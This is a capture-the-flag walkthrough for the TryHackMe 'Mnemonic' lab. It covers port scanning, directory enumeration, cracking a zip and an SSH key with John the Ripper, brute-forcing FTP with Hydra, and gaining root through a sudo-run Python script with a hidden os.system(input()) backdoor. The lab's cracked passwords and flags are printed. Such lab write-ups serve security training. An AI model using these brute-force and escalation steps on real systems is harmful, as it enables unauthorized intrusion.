# THM > Mnemonic

Hit me! You need 1 things : hurry up

https://www.youtube.com/watch?v=pBSR3DyobIY

# How many open ports?

Let's start a full Nmap scan (with the `-p-` flag). Nmap discovers 3 open ports:

~~~
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/webmasters/*
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
1337/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e0:42:c0:a5:7d:42:6f:00:22:f8:c7:54:aa:35:b9:dc (RSA)
|   256 23:eb:a9:9b:45:26:9c:a2:13:ab:c1:ce:07:2b:98:e0 (ECDSA)
|_  256 35:8f:cb:e2:0d:11:2c:0b:63:f2:bc:a0:34:f3:dc:49 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
~~~

Answer: `3`

# what is the ssh port number?

SSH is running on a non standard port, and you'll need to run Nmap with `-p-` to discover SSH on port `1337`.

Answer: `1337`

# what is the name of the secret file?

There is a `robots.txt` file which discloses a hidden `/webmaster` directory:

~~~
kali@kali:/data$ curl http://mnemonic.thm/robots.txt
User-agent: *
Allow: / 
Disallow: /webmasters/*
~~~

Let's use `gobuster` to enumerate inside this directory. We discover 2 subfolders: `admin` and `backups`.

~~~
kali@kali:/data$ gobuster dir -u http://mnemonic.thm/webmasters/ -x php,txt,bak,old -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://mnemonic.thm/webmasters/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,bak,old
[+] Timeout:        10s
===============================================================
2020/09/30 16:14:42 Starting gobuster
===============================================================
/.hta (Status: 403)
/.hta.php (Status: 403)
/.hta.txt (Status: 403)
/.hta.bak (Status: 403)
/.hta.old (Status: 403)
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.txt (Status: 403)
/.htaccess.bak (Status: 403)
/.htaccess.old (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.txt (Status: 403)
/.htpasswd.bak (Status: 403)
/.htpasswd.old (Status: 403)
/admin (Status: 301)
/backups (Status: 301)
/index.html (Status: 200)
===============================================================
2020/09/30 16:16:55 Finished
===============================================================
~~~

Further enumerating the `backups` subfolder reveals the existence of a `backups.zip` archive.

~~~
kali@kali:/data$ gobuster dir -u http://mnemonic.thm/webmasters/backups/ -x php,txt,bak,old,tar,zip,gz -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://mnemonic.thm/webmasters/backups/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,bak,old,tar,zip,gz
[+] Timeout:        10s
===============================================================
2020/09/30 16:17:33 Starting gobuster
===============================================================
/.hta (Status: 403)
/.hta.php (Status: 403)
/.hta.txt (Status: 403)
/.hta.bak (Status: 403)
/.hta.old (Status: 403)
/.hta.tar (Status: 403)
/.hta.zip (Status: 403)
/.hta.gz (Status: 403)
/.htaccess (Status: 403)
/.htaccess.gz (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.txt (Status: 403)
/.htaccess.bak (Status: 403)
/.htaccess.old (Status: 403)
/.htaccess.tar (Status: 403)
/.htaccess.zip (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.zip (Status: 403)
/.htpasswd.gz (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.txt (Status: 403)
/.htpasswd.bak (Status: 403)
/.htpasswd.old (Status: 403)
/.htpasswd.tar (Status: 403)
/backups.zip (Status: 200)
/index.html (Status: 200)
===============================================================
2020/09/30 16:20:46 Finished
===============================================================
~~~

Answer: `backups.zip`

# ftp user name?

Let's download the archive and uncompress it. Unfortunately, the archive is password protected:

~~~
kali@kali:/data/mnemonic/files$ wget http://mnemonic.thm/webmasters/backups/backups.zip
--2020-09-30 16:19:44--  http://mnemonic.thm/webmasters/backups/backups.zip
Resolving mnemonic.thm (mnemonic.thm)... 10.10.135.149
Connecting to mnemonic.thm (mnemonic.thm)|10.10.135.149|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 409 [application/zip]
Saving to: ‘backups.zip’

backups.zip                   100%[==============================================>]     409  --.-KB/s    in 0s      

2020-09-30 16:19:44 (60.2 MB/s) - ‘backups.zip’ saved [409/409]
~~~

We'll use John the Ripper to brute force the password using the `rockyou.txt` dictionary:

~~~
kali@kali:/data/mnemonic/files$ /data/src/john/run/zip2john backups.zip > backups.hash
ver 1.0 backups.zip/backups/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 backups.zip/backups/note.txt PKZIP Encr: 2b chk, TS_chk, cmplen=67, decmplen=60, crc=AEE718A8 type=8
kali@kali:/data/mnemonic/files$ /data/src/john/run/john backups.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
00385007         (backups.zip/backups/note.txt)
1g 0:00:00:01 DONE (2020-09-30 16:20) 0.5494g/s 7838Kp/s 7838Kc/s 7838KC/s 0050cent..00257gbjr
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
~~~

Now with the password (`00385007`), we uncompress the archive, which gives us a files named `note.txt`:

~~~
kali@kali:/data/mnemonic/files$ cat backups/note.txt
@vill

James new ftp username: ftpuser
we have to work hard
~~~

This note discloses the existence of a FTP user: `ftpuser`.

Answer: `ftpuser`

# ftp password?

Let's use `hydra` to brute force the FTP password associated to the `ftpuser` account.

~~~
kali@kali:/data/mnemonic/files$ hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://mnemonic.thm
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-30 16:25:59
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://mnemonic.thm:21/
[STATUS] 272.00 tries/min, 272 tries in 00:01h, 14344127 to do in 878:56h, 16 active
[STATUS] 270.67 tries/min, 812 tries in 00:03h, 14343587 to do in 883:14h, 16 active
[21][ftp] host: mnemonic.thm   login: ftpuser   password: love4ever
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-30 16:30:06
~~~

Answer: `love4ever`

# What is the ssh username?

We can now connect to the FTP service using the following credentials: `ftpuser:love4ever`. There are several directories, but only 1 of them (`data-4`) contains files: `id_rsa` and `not.txt`.

~~~
kali@kali:/data/mnemonic/files$ ftp mnemonic.thm
Connected to mnemonic.thm.
220 (vsFTPd 3.0.3)
Name (mnemonic.thm:kali): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwx------   12 1003     1003         4096 Jul 14 18:22 .
drwx------   12 1003     1003         4096 Jul 14 18:22 ..
lrwxrwxrwx    1 1003     1003            9 Jul 14 18:22 .bash_history -> /dev/null
-rw-r--r--    1 1003     1003          220 Jul 13 21:10 .bash_logout
-rw-r--r--    1 1003     1003         3771 Jul 13 21:10 .bashrc
-rw-r--r--    1 1003     1003          807 Jul 13 21:10 .profile
drwxr-xr-x    2 0        0            4096 Jul 13 21:16 data-1
drwxr-xr-x    2 0        0            4096 Jul 13 21:17 data-10
drwxr-xr-x    2 0        0            4096 Jul 13 21:16 data-2
drwxr-xr-x    2 0        0            4096 Jul 13 21:16 data-3
drwxr-xr-x    4 0        0            4096 Jul 14 18:05 data-4
drwxr-xr-x    2 0        0            4096 Jul 13 21:16 data-5
drwxr-xr-x    2 0        0            4096 Jul 13 21:17 data-6
drwxr-xr-x    2 0        0            4096 Jul 13 21:17 data-7
drwxr-xr-x    2 0        0            4096 Jul 13 21:17 data-8
drwxr-xr-x    2 0        0            4096 Jul 13 21:17 data-9
226 Directory send OK.
ftp> cd data-4
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    4 0        0            4096 Jul 14 18:05 .
drwx------   12 1003     1003         4096 Jul 14 18:22 ..
drwxr-xr-x    2 0        0            4096 Jul 14 18:04 3
drwxr-xr-x    2 0        0            4096 Jul 14 18:04 4
-rwxr-xr-x    1 1001     1001         1766 Jul 13 20:34 id_rsa
-rwxr-xr-x    1 1000     1000           31 Jul 13 21:18 not.txt
226 Directory send OK.
~~~

We can download the files using the `get <file>` command. The `not.txt` file seems to indicate the existence of a user named `james`:

~~~
kali@kali:/data/mnemonic/files$ cat not.txt 
james change ftp user password
~~~

Answer: `james`

# What is the ssh password?

The second file (`id_rsa`) that we downloaded from the FTP service is a SSH private key. It is password protected:

~~~
kali@kali:/data/mnemonic/files$ chmod 400 id_rsa 
kali@kali:/data/mnemonic/files$ ssh -p 1337 -i id_rsa james@mnemonic.thm
load pubkey "id_rsa": invalid format
The authenticity of host '[mnemonic.thm]:1337 ([10.10.202.26]:1337)' can't be established.
ECDSA key fingerprint is SHA256:nwJynJn7/m7+VP5h40EAKHef3qSEfKTIZsdI8GH+LgI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[mnemonic.thm]:1337,[10.10.202.26]:1337' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
~~~

Let's use John once more to brute force the password:

~~~
kali@kali:/data/mnemonic/files$ /data/src/john/run/ssh2john.py id_rsa > ssh.hash
kali@kali:/data/mnemonic/files$ /data/src/john/run/john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Note: This format may emit false positives, so it will keep trying even after finding a
possible candidate.
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bluelove         (id_rsa)
1g 0:00:00:04 DONE (2020-09-30 18:38) 0.2100g/s 3012Kp/s 3012Kc/s 3012KC/sa6_123..*7¡Vamos!
Session completed. 
~~~

Answer: `bluelove`

# What is the condor password?

*Hint: mnemonic encryption "image based"*

We are now able to connect to the SSH service using the following credentials: `james:bluelove`. Unfortunately, after a short while an "IPS/IDS System" claims that we are unauthorized and kills the connection.

~~~
kali@kali:/data/mnemonic/files$ ssh -p 1337 james@mnemonic.thm
james@mnemonic.thm's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-111-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Sep 30 16:39:05 UTC 2020

  System load:  0.88               Processes:           93
  Usage of /:   34.0% of 12.01GB   Users logged in:     0
  Memory usage: 32%                IP address for eth0: 10.10.202.26
  Swap usage:   0%

  => There is 1 zombie process.


51 packages can be updated.
0 updates are security updates.


Last login: Thu Jul 23 20:40:09 2020 from 192.168.1.5
                                                                               
Broadcast message from root@mnemonic (somewhere) (Wed Sep 30 16:39:13 2020):   
                                                                               
     IPS/IDS SYSTEM ON !!!!                                                    
 **     *     ****  **                                                         
         * **      *  * *                                                      
*   ****                 **                                                    
 *                                                                             
    * *            *                                                           
       *                  *                                                    
         *               *                                                     
        *   *       **                                                         
* *        *            *                                                      
              ****    *                                                        
     *        ****                                                             
                                                                               
 Unauthorized access was detected.                                             
                                                                               
~~~

Reconnect if it happens and try to be quicker. Enumerating james' home reveals 2 interesting files: `6450.txt` and `noteforjames.txt`:

~~~
james@mnemonic:~$ ls -la
total 44
drwx------  6 james james 4096 Jul 14 18:20 .
drwxr-xr-x 10 root  root  4096 Jul 14 18:27 ..
-rw-r--r--  1 vill  vill   116 Jul 14 17:56 6450.txt
lrwxrwxrwx  1 james james    9 Jul 14 18:20 .bash_history -> /dev/null
-rw-r--r--  1 james james  220 Jul 13 19:59 .bash_logout
-rw-r--r--  1 james james 3771 Jul 13 19:59 .bashrc
drwx------  2 james james 4096 Jul 13 22:14 .cache
drwx------  3 james james 4096 Jul 13 22:42 .gnupg
drwxrwxr-x  3 james james 4096 Jul 13 21:34 .local
-rw-r--r--  1 vill  vill   155 Jul 13 20:31 noteforjames.txt
-rw-r--r--  1 james james  807 Jul 13 19:59 .profile
drwx------  2 james james 4096 Jul 13 21:16 .ssh
james@mnemonic:~$ cat 6450.txt
5140656
354528
842004
1617534
465318
1617534
509634
1152216
753372
265896
265896
15355494
24617538
3567438
15355494
james@mnemonic:~$ cat noteforjames.txt
noteforjames.txt

@vill

james i found a new encryption İmage based name is Mnemonic  

I created the condor password. don't forget the beers on saturday
~~~

There are interesting directories in condor's home, which names are base64 encoded:

~~~
james@mnemonic:~$ ls -la /home/condor
ls: cannot access '/home/condor/..': Permission denied
ls: cannot access '/home/condor/'\''VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ=='\''': Permission denied
ls: cannot access '/home/condor/.gnupg': Permission denied
ls: cannot access '/home/condor/.bash_logout': Permission denied
ls: cannot access '/home/condor/.bashrc': Permission denied
ls: cannot access '/home/condor/.profile': Permission denied
ls: cannot access '/home/condor/.cache': Permission denied
ls: cannot access '/home/condor/.bash_history': Permission denied
ls: cannot access '/home/condor/.': Permission denied
ls: cannot access '/home/condor/aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw==': Permission denied
total 0
d????????? ? ? ? ?            ?  .
d????????? ? ? ? ?            ?  ..
d????????? ? ? ? ?            ? 'aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw=='
l????????? ? ? ? ?            ?  .bash_history
-????????? ? ? ? ?            ?  .bash_logout
-????????? ? ? ? ?            ?  .bashrc
d????????? ? ? ? ?            ?  .cache
d????????? ? ? ? ?            ?  .gnupg
-????????? ? ? ? ?            ?  .profile
d????????? ? ? ? ?            ? ''\''VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ=='\'''
~~~

Decoding the first string results in a URL:

~~~
kali@kali:/data$ echo "aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw==" | base64 -d
https://i.ytimg.com/vi/K-96JmC2AkE/maxresdefault.jpg
~~~

After trying several steganographic tricks with this picture without success, I eventually found a program named [Mnemonic](https://github.com/MustafaTanguner/Mnemonic.git) that decodes a secret hidden in an image. Provide the image path (`maxresdefault.jpg`) and the secret file (`6450.txt`) to reveal the secret password:

~~~
kali@kali:/data/mnemonic/files$ git clone https://github.com/MustafaTanguner/Mnemonic.git
kali@kali:/data/mnemonic/files$ cd Mnemonic/
kali@kali:/data/mnemonic/files/Mnemonic$ python3 -m pip install --user colored
kali@kali:/data/mnemonic/files/Mnemonic$ python3 -m pip install --user opencv-python
kali@kali:/data/mnemonic/files/Mnemonic$ python3 Mnemonic.py 


ooo        ooooo                                                                o8o            
`88.       .888'                                                                `"'            
 888b     d'888  ooo. .oo.    .ooooo.  ooo. .oo.  .oo.    .ooooo.  ooo. .oo.   oooo   .ooooo.  
 8 Y88. .P  888  `888P"Y88b  d88' `88b `888P"Y88bP"Y88b  d88' `88b `888P"Y88b  `888  d88' `"Y8 
 8  `888'   888   888   888  888ooo888  888   888   888  888   888  888   888   888  888       
 8    Y     888   888   888  888    .o  888   888   888  888   888  888   888   888  888   .o8 
o8o        o888o o888o o888o `Y8bod8P' o888o o888o o888o `Y8bod8P' o888o o888o o888o `Y8bod8P' 


******************************* Welcome to Mnemonic Encryption Software *********************************
*********************************************************************************************************
***************************************** Author:@villwocki *********************************************
*********************************************************************************************************
****************************** https://www.youtube.com/watch?v=pBSR3DyobIY ******************************
---------------------------------------------------------------------------------------------------------


Access Code image file Path:/data/mnemonic/files/maxresdefault.jpg
File exists and is readable


Processing:0.txt'dir.


*************** PROCESS COMPLETED ***************
Image Analysis Completed Successfully. Your Special Code:
[1804052473695455217[***REDACTED***]00000000000]

(1) ENCRYPT (2) DECRYPT

>>>>2
ENCRYPT Message to file Path'

Please enter the file Path:/data/mnemonic/files/6450.txt
 
pasificbell1981
 
PRESS TO QUİT 'ENTER' OR 'E' PRESS TO CONTİNUE.
~~~

Answer: `pasificbell1981`

# User flag

Coming back to the second directory found in condor's home, let's decode the base64 string to reveal the user flag:

~~~
kali@kali:/data$ echo "VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ==" | base64 -d
THM{a5f82a00e2feee3465249b855be71c01}
~~~

Answer: `THM{a5f82a00e2feee3465249b855be71c01}`

# Root flag

We can now connect as `condor`:

~~~
$ sshpass -p "pasificbell1981" ssh -p 1337 condor@mnemonic.thm
~~~

The user can run a python3 script as root:

~~~
condor@mnemonic:~$ sudo -l
[sudo] password for condor: 
Matching Defaults entries for condor on mnemonic:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User condor may run the following commands on mnemonic:
    (ALL : ALL) /usr/bin/python3 /bin/examplecode.py
~~~

This program is owned by `root`and we don't have write access:

~~~
condor@mnemonic:~$ ls -l /bin/examplecode.py
-rw-r--r-- 1 root root 2352 Jul 15 15:23 /bin/examplecode.py
~~~

Let's check the code:

```python
#!/usr/bin/python3
import os
import time
import sys
def text(): #text print 


	print("""

	------------information systems script beta--------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	----------------@author villwocki------------------""")
	time.sleep(2)
	print("\nRunning...")
	time.sleep(2)
	os.system(command="clear")
	main()


def main():
	info()
	while True:
		select = int(input("\nSelect:"))

		if select == 1:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="ip a")
			print("Main Menü press '0' ")
			print(x)

		if select == 2:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="ifconfig")
			print(x)

		if select == 3:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="ip route show")
			print(x)

		if select == 4:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="cat /etc/os-release")
			print(x)

		if select == 0: 
			time.sleep(1)
			ex = str(input("are you sure you want to quit ? yes : "))
		
			if ex == ".":
				print(os.system(input("\nRunning....")))
			if ex == "yes " or "y":
				sys.exit()
                      

		if select == 5:                     #root
			time.sleep(1)
			print("\nRunning")
			time.sleep(2)
			print(".......")
			time.sleep(2)
			print("System rebooting....")
			time.sleep(2)
			x = os.system(command="shutdown now")
			print(x)

		if select == 6:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="date")
			print(x)




		if select == 7:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="rm -r /tmp/*")
			print(x)

                      
              


       


            

def info():                         #info print function
	print("""

	#Network Connections   [1]

	#Show İfconfig         [2]

	#Show ip route         [3]

	#Show Os-release       [4]

        #Root Shell Spawn      [5]           

        #Print date            [6]

	#Exit                  [0]

	""")

def run(): # run function 
	text()

run()
```

When run, the program will display a menu with several options. Analyzing the code, we can notice that option 0 (exit) will prompt for a confirmation. If the answer is a dot (`.`) the program will display a fake `Running...` string, which is actually a prompt (`input`) that waits for a command to execute (`os.system`):

```python
os.system(input("\nRunning...."))`
```

Let's run the program as `root` and get a root shell by executing `/bin/bash`:

~~~
condor@mnemonic:~$ sudo python3 /bin/examplecode.py 


	------------information systems script beta--------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	----------------@author villwocki------------------

Running...



	#Network Connections   [1]

	#Show İfconfig         [2]

	#Show ip route         [3]

	#Show Os-release       [4]

        #Root Shell Spawn      [5]           

        #Print date            [6]

	#Exit                  [0]

	

Select:0
are you sure you want to quit ? yes : .

Running..../bin/bash
root@mnemonic:~# id
uid=0(root) gid=0(root) groups=0(root)
~~~

Now, we can read the root flag:

~~~
root@mnemonic:~# 
root@mnemonic:~# cd /root
root@mnemonic:/root# ls -la
total 44
drwx------  6 root root 4096 Jul 15 15:30 .
drwxr-xr-x 24 root root 4096 Jul 13 19:36 ..
lrwxrwxrwx  1 root root    9 Jul 14 18:16 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Jul 13 22:18 .cache
-rw-r--r--  1 root root  220 Sep 30 18:02 f2.txt
drwx------  3 root root 4096 Jul 13 22:18 .gnupg
drwxr-xr-x  3 root root 4096 Jul 13 20:16 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   36 Jul 13 20:45 root.txt
drwx------  2 root root 4096 Jul 13 20:33 .ssh
-rw-------  1 root root    0 Jul 15 15:30 .viminfo
-rw-r--r--  1 root root  165 Jul 14 21:02 .wget-hsts
root@mnemonic:/root# cat root.txt
THM{congratulationsyoumadeithashme}
~~~

The root flag expects the middle string to be the MD5 hash:

~~~
root@mnemonic:/root# echo -n "congratulationsyoumadeithashme" | md5sum
2a4825f50b0c16636984b448669b0586  -
~~~

Answer: `THM{2a4825f50b0c16636984b448669b0586}`
